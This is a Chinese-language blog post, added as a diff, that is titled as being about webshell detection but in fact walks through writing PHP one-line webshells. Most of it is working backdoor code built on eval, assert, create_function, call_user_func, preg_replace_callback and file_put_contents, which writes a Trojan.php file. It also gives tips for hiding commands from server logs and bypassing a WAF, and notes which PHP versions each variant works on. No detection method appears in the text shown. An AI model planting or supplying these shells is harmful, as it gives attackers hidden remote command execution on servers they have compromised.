@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Webshell检测 | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Webshell检测</h2>
+  <p class="post-date">2020-09-11</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Web：指的是在Web服务器，而shell是用脚本语言编写的脚本程序，Webshell就是就是Web的一个管理工具，可以对Web服务器进行操作的权限，也叫webadmin。</p>
+<p>Webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到Web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h5><p>Webshell根据编程语言可以分为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP木马</span><br><span class="line">ASP木马</span><br><span class="line">.NET木马</span><br><span class="line">JSP木马</span><br><span class="line">python动态网页</span><br></pre></td></tr></table></figure>
+
+<h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>根据功能分为<code>大马</code>、<code>小马</code>、<code>打包马</code>、<code>脱裤马</code>；</p>
+<p>小马通常指的一句话木马，体积较小，例如：<code>&lt;%eval request(“pass”)%&gt;</code>通常把这句话写入一个文档里面，然后修改xx.asp或php后缀。然后上传至服务器上。eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。</p>
+<p>大马通常体积比较大 一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序。</p>
+<h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>由以上Webshell功能介绍了解到，它们使用各编程语编写并上传到目标服务器上执行；尝试获取系统命令、及网站web权限。因此需要使用对应编程语言内系统函数。</p>
+<p>（PHP语言示例）</p>
+<h5 id="system"><a href="#system" class="headerlink" title="system"></a>system</h5><p>函数将命令作为参数，并输出结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(system(&#39;date&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910191501727.png" alt="image-20200910191501727"></p>
+<p> PHP 中的<code>超全局变量</code>(如<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>、<code>$_COOKIE</code>）获取攻击者的指令输入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">eval($tmp);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910192925561.png" alt="image-20200910192925561"></p>
+<p>这里还有点问题：</p>
+<ol>
+<li>使用了超全局变量 <code>$_GET</code> 来通过 get 方法获取用户的输入命令。但是 GET 方法有一些限制，第一是存在长度限制：特定的浏览器及服务器会对通过 get 方法提交的字符串有一定的限制。第二是当网站管理员查 log 的时候，会看到明文的 get 请求参数，容易被发现，相比之下， post 请求敏感内容不容易被发现。所以最好把 get 方法换成 post 方法。</li>
+<li>system 函数不应该被写进去。一方面是因为因为有时候 php 中的一些危险函数会被开发者或者网站管理人员禁用，我们可以先不写命令执行函数，攻击的时候可以自行选择更厉害的方法进行绕过。另一方面是写入了 system 这个一句话木马就只能执行命令了，但是不写的话通过使用不同的 payload 一个一句话木马其实啥都能做（就像一句话木马连上菜刀之后的功能），基本跟大马一样。</li>
+<li>在 eval 前面可以加一个 <code>@</code>，@是忽略可能出现的错误。</li>
+</ol>
+<p>因此最后形成的一句话木马：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">@eval($_POST[cmd]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910201443491.png" alt="image-20200910201443491"></p>
+<h5 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h5><p>assert 这个函数在 php 语言中是用来判断一个表达式是否成立。返回 true or false；assert 函数的参数会被执行，这跟 eval() 类似。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">assert(system(&quot;date&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910202300583.png" alt="image-20200910202300583"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;post型</span><br><span class="line">&lt;?php</span><br><span class="line">@assert($_POST[&#39;c&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给 assert() 函数传入字符串参数，这个特性在 7.2 禁用，在 8.0 版本时会被彻底删除。</span><br></pre></td></tr></table></figure>
+
+<p>注意：我们对一句话木马使用的一些 payload，比如 phpinfo() 或者 system(‘command’)，因为不是字符串，所以也就不受版本限制。</p>
+<p>如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910202837253.png" alt="image-20200910202837253"></p>
+<h5 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h5><p>在php中，函数<code>create_function</code>主要用来创建匿名函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string create_function(string $args, string $code)</span><br><span class="line">string $args 变量部分</span><br><span class="line">string $code 方法代码部分</span><br></pre></td></tr></table></figure>
+
+<p>注意当我们使用此匿名函数的时候，方法代码部分会被执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class="line">$tmp();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910203507277.png" alt="image-20200910203507277"></p>
+<p>构造一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class="line">$tmp();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把用户传递的数据生成一个函数 tmp()，然后再执行 tmp()：</p>
+<p><img src="/images/webshell/image-20200910203732113.png" alt="image-20200910203732113"></p>
+<h5 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h5><p><code>call_user_func</code> 这个函数可以调用其它函数，被调用的函数是 <code>call_user_func</code> 的第一个函数，被调用的函数的参数是 <code>call_user_func</code> 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">call_user_func(system(&quot;date&quot;));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910205446756.png" alt="image-20200910205446756"></p>
+<p>其实所有的一句话木马都由两部分组成：</p>
+<ol>
+<li>接收攻击者输入</li>
+<li>命令执行函数</li>
+</ol>
+<p>在<code>PHP Version 7.3.4</code>，webshell 是无法回显的.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class="line">call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示显示为空</p>
+<p><img src="/images/webshell/image-20200910210011420.png" alt="image-20200910210011420"></p>
+<p>绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class="line">@call_user_func(assert,phpinfo());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200910210301627.png" alt="image-20200910210301627"></p>
+<p>由以上<code>assert()</code>函数介绍，给 assert() 函数传入字符串参数，这个特性在 7.2 禁用。</p>
+<p>因为通过超全局常量 <code>$_GET[&#39;&#39;]</code>获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。</p>
+<p>但是直接<code>assert(phpinfo())</code>传入的参数是函数，所以就不会触发函数禁用，可以正常回显。</p>
+<p>此时更换PHP版本为<code>7.0.33</code>如下图所示可以显示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class="line"></span><br><span class="line">@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200911104416978.png" alt="image-20200911104416978"></p>
+<p>更换7.1.20尝试，无法显示phpinfo信息</p>
+<p><img src="/images/webshell/image-20200911104522817.png" alt="image-20200911104522817"></p>
+<p>这个禁用特性其实是从 php 7.1 版本开始，所以 <code>call_user_func + assert</code> 构造的一句话木马在 php 7.0 版本及以下可以使用。</p>
+<h5 id="preg-replace-callback"><a href="#preg-replace-callback" class="headerlink" title="preg_replace_callback"></a>preg_replace_callback</h5><p> <code>preg_replace /e</code> 函数写 webshell，因为此函数5.5.0及以上版本已经被弃用了。使用 preg_replace_callback() 代替。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;), $_REQUEST[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此 webshell 的原理为：通过 <code>create_function</code> “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。</p>
+<p><img src="/images/webshell/image-20200911105751006.png" alt="image-20200911105751006"></p>
+<h5 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h5><p>webshell 调试三部曲：</p>
+<ol>
+<li>把函数写在 php 文件中，看能否执行</li>
+<li>写成 <code>$_GET[&#39;&#39;]</code> 方式传入命令，看能否执行</li>
+<li>写成 <code>$_POST[&#39;&#39;]</code>方式传入命令，能能否执行命令<br><code>注：</code>2、3步可以合成通过<code>$_REQUEST[&#39;&#39;]</code>方法传入命令。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class="line">&#x2F;&#x2F;eval($tmp);</span><br><span class="line">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class="line">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;$tmp();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class="line">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class="line">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;), $_REQUEST[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">$test&#x3D;&#39;&lt;?php $a&#x3D;$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#39;;</span><br><span class="line">file_put_contents(&quot;Trojan.php&quot;, $test);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面这个 webshell 利用函数生成 <code>Trojan.php</code> 木马文件。<br><code>file_put_contents</code> 函数：生成一个文件。第一个参数是文件名，第二个参数是文件的内容。</p>
+<p><img src="/images/webshell/image-20200911110201716.png" alt="image-20200911110201716"></p>
+<p><img src="/images/webshell/image-20200911110325971.png" alt="image-20200911110325971"></p>
+<p>如上图所示：命令成功执行</p>
+<h5 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h5><p>exec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">exec(&quot;ls&quot;)</span><br><span class="line">&#x2F;&#x2F;echo exec(&quot;ls&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>无法回显，使用<code>exec()</code>函数执行echo命令，只会输出最后一行命令结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;exec(&quot;ls&quot;)</span><br><span class="line">echo exec(&quot;ls&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/webshell/image-20200911111810853.png" alt="image-20200911111810853"></p>
+<p>如果指定了第二个参数，则返回结果为数组。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;exec(&quot;ls&quot;)</span><br><span class="line">exec(&quot;ls&quot;,$array);</span><br><span class="line">print_r($array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
